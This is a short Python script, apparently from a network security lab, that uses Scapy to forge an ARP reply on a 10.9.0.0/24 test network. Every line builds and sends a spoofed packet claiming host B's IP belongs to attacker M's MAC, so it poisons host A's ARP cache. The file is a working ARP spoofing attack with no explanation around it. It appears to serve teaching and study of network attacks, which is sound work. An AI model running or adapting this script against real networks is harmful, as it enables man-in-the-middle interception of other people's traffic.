#!/usr/bin/env python3
from scapy.all import *

IP_A = "10.9.0.5"
IP_B = "10.9.0.6"
IP_M = "10.9.0.105"

MAC_A = "02:42:0a:09:00:05"
MAC_B = "02:42:0a:09:00:06"
MAC_M = "02:42:0a:09:00:69"

E = Ether(dst=MAC_A,src=MAC_M)
A = ARP(op=2, hwsrc=MAC_M, psrc=IP_B, hwdst=MAC_A, pdst=IP_A)

pkt = E/A
pkt.show()
sendp(pkt)